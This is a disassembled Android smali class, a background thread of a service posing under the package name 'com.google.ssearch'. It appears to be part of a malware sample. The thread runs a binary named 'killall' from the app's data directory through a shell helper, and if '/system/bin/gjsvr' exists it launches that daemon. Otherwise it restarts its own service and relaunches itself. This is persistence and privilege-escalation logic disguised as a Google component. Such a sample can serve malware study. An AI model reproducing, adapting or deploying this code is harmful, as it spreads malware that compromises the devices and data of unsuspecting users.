.class Lcom/google/ssearch/SearchService$MyThread;
.super Ljava/lang/Thread;
.source "SearchService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/google/ssearch/SearchService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "MyThread"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/google/ssearch/SearchService;


# direct methods
.method constructor <init>(Lcom/google/ssearch/SearchService;)V
    .locals 0

    .prologue
    .line 44
    iput-object p1, p0, Lcom/google/ssearch/SearchService$MyThread;->this$0:Lcom/google/ssearch/SearchService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    .prologue
    .line 46
    iget-object v4, p0, Lcom/google/ssearch/SearchService$MyThread;->this$0:Lcom/google/ssearch/SearchService;

    invoke-virtual {v4}, Lcom/google/ssearch/SearchService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 47
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/data/data/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/killall /data/data/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, ""

    invoke-static {v4, v5}, Lcom/google/ssearch/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 49
    const-wide/16 v4, 0x1388

    :try_start_0
    invoke-static {v4, v5}, Lcom/google/ssearch/SearchService$MyThread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 52
    :goto_0
    new-instance v4, Ljava/io/File;

    const-string v5, "/system/bin/gjsvr"

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 53
    const-string v4, "/system/bin/gjsvr"

    const-string v5, ""

    invoke-static {v4, v5}, Lcom/google/ssearch/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 56
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v4

    invoke-static {v4}, Landroid/os/Process;->killProcess(I)V

    .line 70
    :goto_1
    return-void

    .line 58
    :cond_0
    const-string v4, "am"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "startservice -n "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/com.google.ssearch.SearchService"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lcom/google/ssearch/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 60
    iget-object v4, p0, Lcom/google/ssearch/SearchService$MyThread;->this$0:Lcom/google/ssearch/SearchService;

    invoke-virtual {v4}, Lcom/google/ssearch/SearchService;->getBaseContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 61
    .local v2, "pkgManager":Landroid/content/pm/PackageManager;
    iget-object v4, p0, Lcom/google/ssearch/SearchService$MyThread;->this$0:Lcom/google/ssearch/SearchService;

    invoke-virtual {v4}, Lcom/google/ssearch/SearchService;->getBaseContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    .line 63
    .local v3, "str":Ljava/lang/String;
    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 64
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v4, 0x8000000

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 65
    const/high16 v4, 0x400000

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 66
    const/high16 v4, 0x10000

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 67
    iget-object v4, p0, Lcom/google/ssearch/SearchService$MyThread;->this$0:Lcom/google/ssearch/SearchService;

    invoke-virtual {v4, v1}, Lcom/google/ssearch/SearchService;->startActivity(Landroid/content/Intent;)V

    .line 68
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v4

    invoke-static {v4}, Landroid/os/Process;->killProcess(I)V

    goto :goto_1

    .line 50
    .end local v1    # "intent":Landroid/content/Intent;
    .end local v2    # "pkgManager":Landroid/content/pm/PackageManager;
    .end local v3    # "str":Ljava/lang/String;
    :catch_0
    move-exception v4

    goto :goto_0
.end method
